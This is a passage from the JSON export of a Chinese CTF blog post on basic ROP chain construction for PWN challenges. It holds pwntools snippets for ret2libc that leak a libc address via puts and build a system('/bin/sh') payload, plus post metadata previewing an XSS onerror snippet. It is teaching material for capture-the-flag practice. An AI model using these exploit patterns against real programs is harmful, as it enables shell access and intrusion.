style=\"color: #82AAFF\">p32</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">puts_plt</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">p32</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">main</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #82AAFF\">p32</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">libc_start_main_go</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># io.recvuntil(&#39;&#39;)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">sendline</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">payload1</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">get the related addr</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">libc_start_main_addr </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">u32</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">p</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recv</span><span style=\"color: #89DDFF\">()[</span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #F78C6C\">4</span><span style=\"color: #89DDFF\">])</span><span style=\"color: #BABED8\">     </span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">print</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">addr:</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #82AAFF\"> hex</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">libc_start_main_addr</span><span style=\"color: #89DDFF\">))</span></span></code></pre></div><p><strong>对应构造 exp 模式为：</strong></p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">system_addr </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> 找到对应 libc 版本后 system 的地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">binsh_addr </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> 找到对饮 libc版本后 </span><span style=\"color: #89DDFF\">/</span><span style=\"color: #82AAFF\">bin</span><span style=\"color: #89DDFF\">/</span><span style=\"color: #BABED8\">sh 的地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">payload </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">flat</span><span style=\"color: #89DDFF\">([</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">A</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #82AAFF\"> 溢出长度</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">需要用 cyclic 重新测试</span><span style=\"color: #89DDFF\">),</span><span style=\"color: #82AAFF\"> system_addr</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #C792EA\">0x</span><span style=\"color: #F78C6C\">deadbeef</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> binsh_addr</span><span style=\"color: #89DDFF\">])</span><span style=\"color: #BABED8\"> </span><span style=\"color: #676E95; font-style: italic\"># 0xdeadbeef 为 system 地址返回，可以随意设置</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">sh</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">sendline</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">payload</span><span style=\"color: #89DDFF\">)</span></span></code></pre></div><p>一共需要两次 exp的编写，便可以完成对没有<code>/bin/sh</code>与<code>system</code>的<code>ret2libc</code>题目</p>\n","feature":true,"text":"查找对应溢出一般的溢出内容是EIP，因为EIP寄存器存储着我们CPU要读取指令的地址 可以通过 cyclic 数字这个指令来获取判断溢出点的一个长度为输入的一个...","permalink":"/post/PWN的基本ROP链构造","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"CTF","slug":"CTF","count":5,"path":"api/categories/CTF.json"}],"tags":[{"name":"PWN","slug":"PWN","count":1,"path":"api/tags/PWN.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E6%89%BE%E5%AF%B9%E5%BA%94%E6%BA%A2%E5%87%BA\"><span class=\"toc-text\">查找对应溢出</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F\"><span class=\"toc-text\">保护模式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Ret2text\"><span class=\"toc-text\">Ret2text</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Ret2shellcode\"><span class=\"toc-text\">Ret2shellcode</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Ret2libc\"><span class=\"toc-text\">Ret2libc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%90%AB%E6%9C%89-system-%E5%92%8C-bin-sh\"><span class=\"toc-text\">含有 system 和 &#x2F;bin&#x2F;sh</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%8D%E5%90%AB%E6%9C%89-bin-sh\"><span class=\"toc-text\">不含有 &#x2F;bin&#x2F;sh</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%8D%E5%90%AB%E6%9C%89-System-%E5%92%8C-bin-sh\"><span class=\"toc-text\">不含有 System 和 &#x2F;bin&#x2F;sh</span></a></li></ol></li></ol>","author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"强网杯2022","uid":"a6ba9e79ebbec5d852da03b23e7284e1","slug":"强网杯2022","date":"2022-07-29T15:44:33.000Z","updated":"2023-10-12T03:51:51.787Z","comments":true,"path":"api/articles/强网杯2022.json","keywords":null,"cover":"https://cover.png","text":"强网先锋farcefile扫描到 www.zip ，通过测试发现 检查后缀和 content-type ，文件名是随机字符串 数据存储于 cookie 中，通过...","permalink":"/post/强网杯2022","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"13 mins."},"categories":[{"name":"CTF","slug":"CTF","count":5,"path":"api/categories/CTF.json"}],"tags":[{"name":"WP","slug":"WP","count":2,"path":"api/tags/WP.json"}],"author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"feature":true},"next_post":{"title":"XSS Challenges","uid":"7fcba27f174cb492cad0a42b50923924","slug":"XSS Challenges","date":"2021-08-15T10:49:36.000Z","updated":"2023-10-12T01:48:17.288Z","comments":true,"path":"api/articles/XSS Challenges.json","keywords":null,"cover":"https://cover.png","text":"XSS ChallengesStage #1发现没有任何过滤，并且不需要任何闭合 shell&lt;img src=&#39;#&#39; onerror=al...","permalink":"/post/XSS Challenges","photos":[],"count_time":{"symbolsCount":"3.7k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":5,"path":"api/categories/CTF.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}],"author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"feature":true}}